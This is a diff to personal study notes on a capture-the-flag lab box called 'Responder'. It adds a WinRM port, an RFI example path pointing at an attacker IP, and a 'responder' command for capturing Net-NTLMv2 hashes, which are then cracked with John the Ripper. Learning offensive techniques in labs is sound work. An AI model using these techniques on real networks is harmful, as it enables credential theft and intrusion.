@@ -70,6 +70,7 @@ http://10.129.1.15/dashboard/index.php
 # Responder
 
 -> http (port 80) | unika.htb
+-> wsman (port 5985) | Web Services for Management
 
 run it through:
 
@@ -97,12 +98,18 @@ sudo vi /etc/hosts
 ```
 -> An **RFI** tricks the server into including file from another server such as the attacker's server.
 ```
-//10.10.14.6/somefile
+//10.10.14.224/somefile
 ```
 
 -> Responder utility tool
 - Capture credentials and perform Adversary-in-the-Middle (AiTM) attacks on local networks
 
+```bash
+sudo responder -I tun0      
+# listens on tun0 virt interface for LLMNR, NBT-NS and mDNS broadcast requests
+```
+
 
 -> Net-NTLMv2 is the challenge-response authentication protocol used by Windows to verify a user's identity over a network (such as SMB, HTTP, or LDAP) without sending the actual password in plaintext.
 - **john the ripper**: takes that Net-NTLMv2 challenge-response then tries millions of passwords to check for collisions
+
